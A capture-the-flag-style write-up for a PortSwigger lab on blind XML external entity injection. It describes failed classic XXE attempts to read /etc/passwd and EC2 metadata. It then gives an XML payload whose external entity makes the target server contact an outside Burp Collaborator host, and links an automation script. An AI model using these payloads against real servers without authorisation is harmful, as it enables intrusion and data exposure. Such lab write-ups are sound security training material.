\+ Lab #3    : Blind XXE with out-of-band interaction\
\+ Lab Level : Practitioner\
\+ Link      : https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

## About:
This lab has a ```Check stock``` feature that parses XML input but does not display the result.<br/>
You can detect the [blind XXE vulnerability](https://portswigger.net/web-security/xxe/blind) by triggering out-of-band interactions with an external domain.<br/>
To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.<br/>

## End Goal:
Make the XML parser issue a ```DNS lookup``` and ```HTTP requests``` to ```Burp Collaborator's default public server```.

* First of all, we need to find an XML data entry point where we can test for XXE vulnerability.
* According to the lab description, the target Web Application has a check stock feature that parses XML input.
  ![XXE](https://user-images.githubusercontent.com/101610095/221443861-16357268-24f6-40be-9eba-cf94b6c412a8.png)
* Let's visit the ```/product``` page and intercept the POST request after clicking on the ```check stock``` button:
  ![XXE2](https://user-images.githubusercontent.com/101610095/221443309-560773a8-e280-438b-b7e9-162d23f0d046.png)
* As you can see here, after clicking on the check stock button, a client-side script issues a POST request to the server, and then the server respond with the following response:<br/> 
  ![XXE3](https://user-images.githubusercontent.com/101610095/221443796-aa626e12-d1df-4bc4-80a2-b2d2d82e0e89.png)
* The client-side script will then process the server's response and update part of the user interface by displaying the number of products left.<br/>
  ![XXE1](https://user-images.githubusercontent.com/101610095/221443008-d18e6537-9e12-4868-9742-a4f126fd598b.png)

## Exploitation:
### Manual:
#### Testing for classic XXE:
* Let's try to retrieve the content of ```/etc/passwd``` file: <br/>
  ![1](https://user-images.githubusercontent.com/101610095/221957490-3527b9de-653e-4e83-b7f8-eb9074b3e4b4.png)
* Let's try performing an ```SSRF``` attack to retrieve EC2 instance meta-data:<br/>
  ![2](https://user-images.githubusercontent.com/101610095/221957499-f594bca5-f8aa-4a0d-9cf2-d320892d3ab1.png)

* As you can see, the Web App is not vulnerable to ```classic XXE```, so let's test if it's the case for ```Blind XXE```

#### Testing for Blind XXE:
* Testing for Blind XXE with out-of-band interaction, is making the target server issue a request to our (Attacker's) server, and then monitor for any DNS lookup or HTTP request from the target server.
* For example, the following payload defines an external entity which will make the target server issue a back-end HTTP request to the specified URL.
```XML
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://2y1g99swzo9j2qzydwi059hca3gu4lsa.oastify.com"> ]>
```
> 📝: **NOTE:** <br/>
> * Since Portswigger's firewall blocks interactions between the Labs and arbitrary external systems, we will be using Burp Collaborator's default public server to perform the attack.<br/>
> * In order to get the url of Burp Collaborator's default public server, go to the ```Collaborator``` tab and then ```Start collaborator```, and finally copy the URL by clicking on ```Copy to Clipboard```<br>

* Now, Let's inject this external entity in between the ```XML Prolog``` and the root element ```<stockCheck>``` and replace the *productId* number with a reference to our malicious external entity ```&xxe;``` just like we did in the previous labs :
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://2y1g99swzo9j2qzydwi059hca3gu4lsa.oastify.com"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
  1
  </storeId>
</stockCheck>
```
* Let's send the request: <br/>
  ![2023-02-28 20_58_25-Burp Suite Professional v2022 11 4 - Temporary Project - licensed to surferxyz](https://user-images.githubusercontent.com/101610095/221964994-d0b5713b-f93f-4a58-920d-864b122b2e94.png)

* Now, go to the ```Collaborator``` tab and click on ```Poll now```, you should see some DNS and HTTP interactions that were initiated by the target server as the result of the payload.<br/>
  ![2023-02-28 21_00_59-Burp Suite Professional v2022 11 4 - Temporary Project - licensed to surferxyz](https://user-images.githubusercontent.com/101610095/221965471-d9bd024d-1d06-4878-ac0b-86d9ef08eea7.png)

* And with this, we triggered an out-of-band interaction with the target server, thus the target Web App is vulnerable to ```Blind XXE```
### Automated:
* Refer to https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/XXE%20Injection/Lab%233/Lab-3.py
* Requirements:
```bash
pip3 install -m requirements.txt
```
* Help Menu: 
```bash
usage: Lab-3.py [-h] -u URL [-n]

Usage Example: python3 Lab-3.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy
```

